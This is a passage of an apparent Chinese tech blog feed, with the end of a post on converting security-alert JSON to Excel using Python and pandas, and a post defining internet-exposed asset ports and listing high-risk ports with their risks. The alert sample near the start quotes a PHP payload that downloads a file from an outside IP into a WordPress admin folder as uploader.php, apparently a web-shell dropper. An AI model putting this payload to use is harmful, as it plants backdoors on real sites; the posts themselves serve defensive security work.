application/x-www-form-urlencoded\n\n\n\nvz=$x=fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/wp-admin/css/colors/blue/uploader.php','w+'),file_get_contents('http://51.79.124.111/vz.txt'));echo+\"aDriv4\".$x;",</span></span><br><span class="line"><span class="string">   "taskId": "",</span></span><br><span class="line"><span class="string">   "status": ""</span></span><br><span class="line"><span class="string">&#125;'''</span></span><br><span class="line">dic_data = json.loads(json_data,strict=<span class="literal">False</span>)</span><br><span class="line">df_data=pd.DataFrame(dic_data,index=[<span class="number">0</span>])</span><br><span class="line">df_data.to_excel(<span class="string">'attack.xlsx'</span>)</span><br></pre></td></tr></table></figure><p>效果：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230818/json%E8%BD%ACexcel.png" alt="json转excel"></p><h2 id="三、注意事项"><a href="#三、注意事项" class="headerlink" title="三、注意事项"></a>三、注意事项</h2><p>因为attackDetail字段有很多类似\n等的转义符，会导致json解析不成功，在json.loads的时候就会报错。报类似于<br><code>json.decoder.JSONDecodeError: Expecting &#39;,&#39; delimiter: line 50 column 149 (char 1339)</code>的错误。所以需要在字符串前面加<code>r</code>标识来忽略掉转义机制。</p><p>常见的字符串标识<code>u,r,b,f</code></p><ul><li>字符串前加u<br>后面字符串以 Unicode格式进行编码，一般用在中文字符串前面，防止因为源码储存格式问题，导致再次使用时出现乱码。</li><li>字符串前加r<br>去掉反斜杠的转义机制。（特殊字符：即那些，反斜杠加上对应字母，表示对应的特殊含义的，比如最常见的”\n”表示换行，”\t”表示Tab等。 ）</li><li>字符串前加b<br>b前缀表示：后面字符串是bytes 类型。</li><li>字符串前加f<br>以 f 开头表示在字符串内支持大括号内的python 表达式字符串拼接。<br>如：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="string">'xiejava'</span></span><br><span class="line">outputstr=<span class="string">f'My name is <span class="subst">&#123;name&#125;</span>'</span></span><br><span class="line">print(outputstr)</span><br></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My name is xiejava</span><br></pre></td></tr></table></figure><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近重保，经常需要通过Excel上报威胁事件。安全设备的告警很多都是json格式的，就需要将json转成Excel。&lt;br&gt;用Python将json转成excel也就三行代码的事，先将json串导入形成字典对象，再通过pandas转成DataFrame直接输出excel。&lt;
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="开发" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="https://xiejava.gitee.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>网络安全之互联网暴露资产端口</title>
    <link href="https://xiejava.gitee.io/posts/ff84f2fb/"/>
    <id>https://xiejava.gitee.io/posts/ff84f2fb/</id>
    <published>2023-05-15T06:22:32.000Z</published>
    <updated>2023-05-15T06:41:20.144Z</updated>
    
    <content type="html"><![CDATA[<p>互联网暴露资产因直接向公众互联网开放，极易遭受来自外部组织或人员的入侵与攻击，是风险管控的高危区域。</p><p>作为企业的安全管理，互联网暴露资产的管理是非常重要的一环。应该建立规范的流程严控互联网暴露端口的审批，对互联网暴露出口应尽量缩减收敛减少暴露面，对互联网暴露面进行定期的探测及时发现没有被纳管的暴露面资产，对因为业务需要必须要暴露的资产端口进行有效的访问控制策略等。</p><p>本文介绍互联网暴露资产端口的定义、分类及管理。</p><h2 id="互联网暴露资产端口定义"><a href="#互联网暴露资产端口定义" class="headerlink" title="互联网暴露资产端口定义"></a>互联网暴露资产端口定义</h2><p>互联网暴露端口指信息系统资产、网络设备或终端设备面向互联网开放服务或开放协议的端口（含 NAT 映射端口），该端口可被其他互联网的资产进行主动探测、访问或连接。当某资产至少具备一个互联网暴露端口时，则认定该资产为互联网暴露资产；当某信息系统内部至少具备一台互联网暴露资产时，则认定该信息系统为互联网暴露信息系统。<br>当互联网暴露资产同时面向内网（或私网）开放服务或开放协议时，相关端口不属于互联网暴露端口，不纳入互联网暴露端口管控范围；当某资产通过互联网主动发起单向通信时，因该资产用于通信服务的端口并未暴露于互联网，也无法被其他互联网资产主动探测、访问或连接，则认定该资产不属于互联网暴露资产，且不具备互联网暴露端口。<br>互联网暴露端口的判定，与该端口是否已执行访问控制策略不相关。</p><h2 id="互联网暴露资产端口分类"><a href="#互联网暴露资产端口分类" class="headerlink" title="互联网暴露资产端口分类"></a>互联网暴露资产端口分类</h2><p>互联网暴露资产（含信息系统、网络设备、终端）端口按照其功能用途，可分为业务类端口及管理类端口两大类：<br>1）业务类端口。具体可细分为以下三类：</p><ul><li>用户访问端口：主要指各类与用户侧交互的，支撑用户访问服务的端口，如 WEB 访问端口、视频流端口等。</li><li>平台交互端口：系统内外部服务器间的接口交互、数据交互等服务端口。</li><li>路由协议端口：常见于路由设备，用于配置路由协议而开放的端口服务，如 BGP边界网关协议端口、OSPF 开放式最短路径优先协议端口等。</li></ul><p>2）管理类端口。主要包含实现远程操控管理、后台访问运维、用户数据收集及用户终端主动管控等服务的端口。</p><h2 id="互联网暴露资产端口管理"><a href="#互联网暴露资产端口管理" class="headerlink" title="互联网暴露资产端口管理"></a>互联网暴露资产端口管理</h2><ul><li>尽量缩减收敛减少暴露面，基于最小使用原则，对于高危风险端口应严禁对互联网开放，尤其是管理类端口如数据库、运维管理等端口。如mysql的3306端口、Redis的6379端口等。对于必须要暴露的资产端口进行有效管控，如：制定合理的访问控制策略、加强鉴权等。</li><li>应该建立互联网暴露资产台账，规范的流程严控互联网暴露端口的审批，动态维护好互联网暴露资产台账。</li><li>对互联网暴露面进行定期的探测及时发现没有被纳管的暴露面资产，对没有没纳管的暴露面资产进行纳管加强管控或下线，及时维护台账。</li></ul><h3 id="常见的高危风险端口"><a href="#常见的高危风险端口" class="headerlink" title="常见的高危风险端口"></a>常见的高危风险端口</h3><table><thead><tr><th>高危端口号（默认）</th><th>22（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>SSH （Secure Shell），安全外壳协议</td></tr><tr><td>应用场景或应用组件</td><td>远程登录、SSH 端口转发</td></tr><tr><td>端口用途说明</td><td>SSH 协议的服务连接端口，可用于进行远程操作维护</td></tr><tr><td>端口类别</td><td>管理类端口</td></tr><tr><td>风险描述</td><td>弱口令、未授权访问、暴力破解、信息泄漏、远程命令执行</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>23（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>Telnet （ 远程终端协议）</td></tr><tr><td>应用场景或应用组件</td><td>远程登录</td></tr><tr><td>端口用途说明</td><td>Telnet 协议的服务连接端口，可用于进行远程操作维护</td></tr><tr><td>端口类别</td><td>管理类端口</td></tr><tr><td>风险描述</td><td>弱口令、未授权访问、暴力破解、信息泄漏、远程命令执行</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>161（UDP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>SNMP（Simple Network Management Protocol，简单网络管理协议）</td></tr><tr><td>端口用途说明</td><td>可用于对网络设备进行远程信息读取、管理和配置</td></tr><tr><td>端口类别</td><td>管理类端口</td></tr><tr><td>风险描述</td><td>爆破默认团队字符串，导致信息泄漏</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>111（TCP/UDP）、2049（TCP/UDP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>NFS（Network File System），网络文件系统</td></tr><tr><td>端口用途说明</td><td>用于远程文件传输</td></tr><tr><td>端口类别</td><td>业务类端口（用户访问端口、平台交互端口）</td></tr><tr><td>风险描述</td><td>权限配置不当</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>3306（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>MySQL（数据库）</td></tr><tr><td>端口用途说明</td><td>MySQL 是一款开源关系数据库管理系统。该端口端口用于数据库远程管理和连接</td></tr><tr><td>端口类别</td><td>管理类端口、业务类端口（平台交互端口）</td></tr><tr><td>风险描述</td><td>暴力破解、信息泄漏、远程命令执行</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>6379（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>Redis（数据库）</td></tr><tr><td>端口用途说明</td><td>Redis 默认管理和服务端口</td></tr><tr><td>端口类别</td><td>管理类端口</td></tr><tr><td>风险描述</td><td>可能会存在未授权访问，或者进行弱口令爆破；获得访问权限后，可能存在任意文件写入导致获取系统远程控制权限。</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>27017（TCP）、27018（TCP）、27019（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>MongoDB（数据库）</td></tr><tr><td>端口用途说明</td><td>用于 MongoDB 数据库的远程管理和服务，以及集群间通信</td></tr><tr><td>端口类别</td><td>管理类端口、业务类端口（平台交互端口）</td></tr><tr><td>风险描述</td><td>爆破，未授权访问</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>1433（TCP）、1434（UDP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>SQLServer（数据库）</td></tr><tr><td>端口用途说明</td><td>SQL Server 是 Microsoft 公司推出的关系型数据库管理系统。<br>1433（默认）端口用于数据库远程管理和连接，1434（默认）用于命名服务</td></tr><tr><td>端口类别</td><td>管理类端口、业务类端口（平台交互端口）</td></tr><tr><td>风险描述</td><td>提权，弱口令，爆破；早期版本还存在远程命令执行漏洞</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>1521（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>Oracle（甲骨文数据库）</td></tr><tr><td>端口用途说明</td><td>Oracle 是甲骨文公司的一款关系数据库管理系统。该端口端口用于数据库远程管理和连接</td></tr><tr><td>端口类别</td><td>管理类端口、业务类端口（平台交互端口）</td></tr><tr><td>风险描述</td><td>暴力破解、信息泄漏、远程命令执行</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>5432（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>PostgreSQL（数据库）</td></tr><tr><td>端口用途说明</td><td>PostgreSQL 是一款开源关系数据库管理系统。该端口用于数据库远程管理和连接</td></tr><tr><td>端口类别</td><td>管理类端口、业务类端口（平台交互端口）</td></tr><tr><td>风险描述</td><td>暴力破解、信息泄漏、远程命令执行</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>3389（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>Windows RDP（远程桌面协议）</td></tr><tr><td>端口用途说明</td><td>用于访问服务器的远程桌面服务，提供基于图形界面的远程操作维护功能。</td></tr><tr><td>端口类别</td><td>管理类端口</td></tr><tr><td>风险描述</td><td>暴力破解，远程控制</td></tr></tbody></table><table><thead><tr><th>高危端口号（默认）</th><th>5800（TCP），5900（TCP）</th></tr></thead><tbody><tr><td>协议或服务</td><td>VNC（Virtual Network Console），虚拟网络控制台</td></tr><tr><td>端口用途说明</td><td>VNC 是一款远程桌面和远程控制软件，5800 和 5900（默认）端口均为 VNC 服务启动端口或远端控制端口</td></tr><tr><td>端口类别</td><td>管理类端口</td></tr><tr><td>风险描述</td><td>暴力破解，远程控制</td></tr></tbody></table><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;互联网暴露资产因直接向公众互联网开放，极易遭受来自外部组织或人员的入侵与攻击，是风险管控的高危区域。&lt;/p&gt;
&lt;p&gt;作为企业的安全管理，互联网暴露资产的管理是非常重要的一环。应该建立规范的流程严控互联网暴露端口的审批，对互联网暴露出口应尽量缩减收敛减少暴露面，对互联网暴露面
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
